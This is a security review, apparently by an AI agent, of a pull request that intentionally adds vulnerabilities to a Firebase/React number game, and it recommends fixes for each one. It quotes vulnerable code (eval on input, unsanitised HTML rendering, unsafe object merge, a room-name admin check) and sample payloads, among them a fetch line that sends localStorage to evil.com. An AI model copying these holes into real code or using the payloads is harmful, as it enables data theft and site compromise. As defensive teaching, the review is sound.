# Security Review: PR #11 - Middle Number Game Vulnerabilities

**Reviewer:** Security Professional Agent  
**Date:** 2025-11-20  
**PR Number:** #11  
**Status:** ⛔ **CRITICAL - DO NOT MERGE**

---

## Executive Summary

PR #11 introduces **MULTIPLE CRITICAL SECURITY VULNERABILITIES** across the Middle Number Game. This code **MUST NOT** be merged to main as it creates severe security risks including:
- Remote Code Execution (RCE)
- Cross-Site Scripting (XSS)
- Prototype Pollution
- Authentication Bypass
- Data Exposure

**Recommendation:** REJECT this PR and implement secure alternatives provided below.

---

## Critical Vulnerabilities

### 1. 🔴 CRITICAL: Code Injection via eval()

**Location:** `src/GameRoom/MiddleNumber.js` lines 148-156

**Vulnerable Code:**
```javascript
async function submitNumber(){
    const enteredValue = numRef.current.value;
    let enteredNum;
    try {
        enteredNum = eval(enteredValue);  // ⛔ EXECUTES ARBITRARY CODE
    } catch(e) {
        enteredNum = enteredValue;
    }
}
```

**Impact:** 
- Allows attackers to execute arbitrary JavaScript code
- Can steal user data, modify application behavior, or compromise entire system
- Attackers can run commands like: `eval("alert(document.cookie)")` or `eval("fetch('https://evil.com?data='+localStorage.getItem('data'))")`

**Secure Alternative:**
```javascript
async function submitNumber(){
    const enteredValue = numRef.current.value;
    const enteredNum = parseInt(enteredValue, 10);
    
    if(isNaN(enteredNum)){
        alert("Please enter a valid number");
        return;
    }
    // Proceed with validated numeric input only
}
```

---

### 2. 🔴 CRITICAL: Cross-Site Scripting (XSS)

**Location:** `src/GameRoom/MiddleNumber.js` lines 222, 264

**Vulnerable Code:**
```javascript
// Line 222 - Player names rendered with dangerouslySetInnerHTML
<p key={idx} 
   dangerouslySetInnerHTML={{__html: `${item.uname}: ${allSubmitted || item.uname === uname ? item.num : (item.num === 0 ? '?' : '✓')} ${winner && winner.uname === item.uname ? '🏆' : ''}`}}>
</p>

// Line 264 - User input rendered as HTML
<p key={idx} dangerouslySetInnerHTML={{__html: `${p.uname}: ${p.userInput || p.num}`}} />
```

**Impact:**
- Attackers can inject malicious scripts via username or number input
- Scripts execute in other users' browsers
- Can steal cookies, session tokens, or perform actions as the victim
- Example attack: username = `<img src=x onerror="alert('XSS')">`

**Secure Alternative:**
```javascript
// Safe rendering without dangerouslySetInnerHTML
const playerNamesDiv = playerNames.map((item, idx) => (
    <p key={idx} style={{fontWeight: winner && winner.uname === item.uname ? 'bold' : 'normal'}}>
        {item.uname}: {allSubmitted || item.uname === uname ? item.num : (item.num === 0 ? '?' : '✓')}
        {winner && winner.uname === item.uname && ' 🏆'}
    </p>
));

// For raw submissions, use text content:
{playerNames.map((p, idx) => (
    <p key={idx}>{p.uname}: {p.num}</p>
))}
```

---

### 3. 🔴 CRITICAL: Prototype Pollution

**Location:** `src/GameRoom/MiddleNumber.js` lines 6-18

**Vulnerable Code:**
```javascript
function merge(target, source) {
    for (let key in source) {  // ⛔ No prototype guards
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];  // ⛔ Allows __proto__ pollution
        }
    }
    return target;
}
```

**Impact:**
- Attackers can modify Object.prototype
- Affects all objects in the application
- Can bypass security checks, cause denial of service
- Example: `merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))`

**Secure Alternative:**
```javascript
// Use built-in structuredClone or safe deep copy
function cloneObject(obj) {
    // Modern browsers support structuredClone
    if (typeof structuredClone !== 'undefined') {
        return structuredClone(obj);
    }
    // Fallback: JSON parse/stringify (safe but limited)
    return JSON.parse(JSON.stringify(obj));
}

// Or use lodash.cloneDeep with proper security settings
// import cloneDeep from 'lodash.clonedeep';
// const cloned = cloneDeep(obj);
```

---

### 4. 🔴 CRITICAL: Authentication Bypass

**Location:** `src/GameRoom/MiddleNumber.js` lines 68-74

**Vulnerable Code:**
```javascript
async function resetAllRooms() {
    if (roomID.includes('admin')) {  // ⛔ Weak check
        const db = getDatabase();
        const allRoomsRef = ref(db, "numrooms");
        remove(allRoomsRef);  // ⛔ Deletes ALL rooms
    }
}
```

**Impact:**
- Any user can delete all game rooms by using "admin" in room name
- Examples: "myadmin", "administrator", "admin123"
- No actual authentication or authorization
- Causes data loss and denial of service

**Secure Alternative:**
```javascript
// Remove this function entirely - admin operations should be:
// 1. Server-side only (Firebase Cloud Functions)
// 2. Protected by Firebase Security Rules
// 3. Use Firebase Authentication with proper role checks

// If absolutely needed client-side, use proper auth:
async function resetAllRooms() {
    const auth = getAuth();
    const user = auth.currentUser;
    
    if (!user) {
        alert("Not authenticated");
        return;
    }
    
    // Get custom claims from ID token
    const idTokenResult = await user.getIdTokenResult();
    if (!idTokenResult.claims.admin) {
        alert("Insufficient permissions");
        return;
    }
    
    // Call server-side function instead
    const functions = getFunctions();
    const resetRooms = httpsCallable(functions, 'resetAllRooms');
    await resetRooms();
}
```

---

### 5. 🟠 HIGH: Information Disclosure

**Location:** `src/GameRoom/MiddleNumber.js` lines 245-248

**Vulnerable Code:**
```javascript
<p style={{fontSize: '12px', color: '#666'}}>
    Debug Info: Room Path: numrooms/{roomID}/unamesnum
</p>
<p style={{fontSize: '10px', color: '#888'}}>
    Current User: {uname} | Players: {playerNames.length}
</p>
```

**Impact:**
- Reveals internal database structure
- Exposes database paths to attackers
- Shows implementation details
- Aids attackers in crafting exploits

**Secure Alternative:**
```javascript
// Remove all debug information from production UI
// Use proper logging infrastructure instead:

// Development only:
if (process.env.NODE_ENV === 'development') {
    console.log('Room path:', `numrooms/${roomID}/unamesnum`);
    console.log('Current user:', uname);
}

// Remove the debug <p> elements entirely from JSX
```

---

### 6. 🟠 HIGH: Insecure Data Storage

**Locations:** 
- `src/GameRoom/MiddleNumber.js` lines 200-202
- `src/JoinGame/JoinGame.js` lines 17-19, 31-37

**Vulnerable Code:**
```javascript
// MiddleNumber.js
localStorage.setItem('lastRoom', roomID);
localStorage.setItem('lastUser', uname);
localStorage.setItem('gameState', JSON.stringify(playerNames));

// JoinGame.js
localStorage.setItem('lastRoomJoined', room);
localStorage.setItem('userName', name);
sessionStorage.setItem('currentGame', JSON.stringify({
    room: room,
    username: name,
    gameType: 'numbers',
    timestamp: new Date().toISOString()
}));
```

**Impact:**
- localStorage/sessionStorage accessible to all scripts (XSS)
- No encryption for sensitive data
- Data persists across sessions
- Can be accessed by malicious extensions

**Secure Alternative:**
```javascript
// Option 1: Don't store sensitive data client-side at all
// Use server-side session management instead

// Option 2: If absolutely needed, use secure storage patterns:
// - Only store non-sensitive data
// - Use short-lived session tokens
// - Implement proper logout/cleanup

// Minimal example:
sessionStorage.setItem('currentGameId', gameId); // Just ID, not full data
// Fetch full game data from server when needed
```

---

### 7. 🟠 HIGH: Database Injection / Path Manipulation

**Location:** `src/JoinGame/JoinGame.js` lines 50-59

**Vulnerable Code:**
```javascript
<input 
    ref={roomRef}
    type="text"
    placeholder="Room name"
    // ⛔ pattern validation REMOVED
    id="room"
/>
<input 
    type="text" 
    ref = {nameRef}
    placeholder="your name"
    // ⛔ pattern validation REMOVED
    id="urname"
/>
```

**Impact:**
- No input validation on room names and usernames
- Can inject special characters: `/`, `.`, `#`, `$`, `[`, `]`
- Can manipulate Firebase database paths
- Examples: `../../otherRoom`, `../admin/config`

**Secure Alternative:**
```javascript
<input 
    ref={roomRef}
    type="text"
    placeholder="Room name"
    pattern="[a-zA-Z0-9_-]{3,20}"  // Alphanumeric, underscore, hyphen only
    title="Room name: 3-20 characters, letters, numbers, - or _ only"
    required
    id="room"
/>
<input 
    type="text" 
    ref={nameRef}
    placeholder="your name"
    pattern="[a-zA-Z0-9_-]{3,20}"
    title="Username: 3-20 characters, letters, numbers, - or _ only"
    required
    id="urname"
/>

// Additional validation in JavaScript:
function validateInput(input, fieldName) {
    const pattern = /^[a-zA-Z0-9_-]{3,20}$/;
    if (!pattern.test(input)) {
        alert(`Invalid ${fieldName}. Use only letters, numbers, - or _ (3-20 characters)`);
        return false;
    }
    return true;
}

const joinRoom = () => {
    const room = roomRef.current.value;
    const name = nameRef.current.value;
    
    if (!validateInput(room, 'room name') || !validateInput(name, 'username')) {
        return;
    }
    
    navigate('/gubs/' + room + '/' + name);
};
```

---

### 8. 🟡 MEDIUM: Error Information Leakage

**Location:** `src/Database/DBFunctions.js` lines 24, 87

**Vulnerable Code:**
```javascript
.catch((error) => {
    console.error(error);
    alert("Error: " + error.message);  // ⛔ Shows error details
});

.catch((error) => {
    console.error(error);
    alert("Database error: " + JSON.stringify(error));  // ⛔ Exposes full error
});
```

**Impact:**
- Reveals internal error messages and stack traces
- Shows database structure and implementation details
- Helps attackers understand the system

**Secure Alternative:**
```javascript
.catch((error) => {
    console.error(error);  // Log for debugging
    // Show generic message to user
    alert("An error occurred. Please try again later.");
    
    // For production, send errors to monitoring service:
    // logErrorToService(error);
});
```

---

## Additional Security Concerns

### Input Type Change

**Location:** `src/GameRoom/MiddleNumber.js` line 289

Changed from `type="number"` to `type="text"` allows non-numeric input, which combined with eval() creates the code injection vulnerability.

**Fix:** Revert to `type="number"` and use proper numeric validation.

---

## Recommended Actions

### Immediate Actions (Critical):

1. ⛔ **DO NOT MERGE** PR #11 to main branch
2. ⛔ **CLOSE** PR #11 or mark as "Security Test Only"
3. ✅ Create new PR with secure implementations
4. ✅ Add security tests to prevent future vulnerabilities

### Security Improvements Needed:

1. **Input Validation**
   - Validate all user inputs (server-side and client-side)
   - Use allowlists, not denylists
   - Sanitize data before display

2. **Firebase Security Rules**
   - Implement proper read/write rules
   - Validate data structure and types
   - Add authentication requirements

3. **Authentication & Authorization**
   - Use Firebase Authentication
   - Implement role-based access control
   - Never trust client-side authorization

4. **Data Protection**
   - Don't store sensitive data client-side
   - Encrypt sensitive data in transit and at rest
   - Implement proper session management

5. **Error Handling**
   - Use generic error messages for users
   - Log detailed errors server-side only
   - Implement monitoring and alerting

6. **Security Testing**
   - Run CodeQL and SAST tools
   - Perform security code reviews
   - Add security-focused unit tests

---

## Secure Code Examples

Complete secure version of submitNumber():

```javascript
async function submitNumber(){
    const db = getDatabase();
    const reff = ref(db,"numrooms/"+roomID+"/unamesnum");
    
    // Validate input is a number
    const enteredValue = numRef.current.value.trim();
    const enteredNum = parseInt(enteredValue, 10);
    
    // Strict validation
    if(isNaN(enteredNum)) {
        alert("Please enter a valid number");
        return;
    }
    
    // Optional: Add range validation
    if(enteredNum < 0 || enteredNum > 9999) {
        alert("Please enter a number between 0 and 9999");
        return;
    }

    try {
        const snapshot = await get(reff);
        if(snapshot.exists()){
            let temp = snapshot.val();
            for(let i = 0; i < temp.length; i++){
                if(temp[i].uname === uname){
                    temp[i].num = enteredNum;
                    break;
                }
            }
            await set(reff,temp);
            setHasSubmitted(true);
        }
    } catch(error) {
        console.error(error);
        alert("An error occurred. Please try again.");
    }
}
```

---

## Firebase Security Rules

Add these rules to `database.rules.json`:

```json
{
  "rules": {
    "numrooms": {
      "$roomId": {
        ".read": true,
        ".write": true,
        ".validate": "newData.hasChildren(['unamesnum', 'suggestedNumber'])",
        "unamesnum": {
          ".validate": "newData.isString() === false",
          "$userId": {
            ".validate": "newData.hasChildren(['uname', 'num']) && newData.child('uname').isString() && newData.child('uname').val().matches(/^[a-zA-Z0-9_-]{3,20}$/) && newData.child('num').isNumber() && newData.child('num').val() >= 0 && newData.child('num').val() <= 9999"
          }
        },
        "suggestedNumber": {
          ".validate": "newData.isNumber() && newData.val() >= 0 && newData.val() <= 9999"
        }
      }
    }
  }
}
```

---

## Testing Recommendations

Add these security tests:

```javascript
describe('Security Tests', () => {
    it('should reject eval injection attempts', () => {
        const maliciousInput = "alert('XSS')";
        expect(() => submitNumber(maliciousInput)).toThrow();
    });
    
    it('should sanitize HTML in usernames', () => {
        const maliciousUsername = "<script>alert('XSS')</script>";
        const sanitized = sanitizeUsername(maliciousUsername);
        expect(sanitized).not.toContain('<script>');
    });
    
    it('should reject invalid room names', () => {
        const invalidRoom = "../../admin";
        expect(validateInput(invalidRoom, 'room')).toBe(false);
    });
});
```

---

## Conclusion

PR #11 contains **intentional security vulnerabilities for testing purposes**. While this serves as a good learning exercise, **this code MUST NEVER be merged to production**.

All identified vulnerabilities have secure alternatives provided above. The development team should:
1. Reject this PR
2. Implement the secure alternatives
3. Add security testing to CI/CD pipeline
4. Conduct regular security reviews

**Security Status: ⛔ CRITICAL - REJECT PR**

---

**Prepared by:** Security Professional Agent  
**Contact:** Available via PR comments  
**Next Review:** After secure implementation is submitted
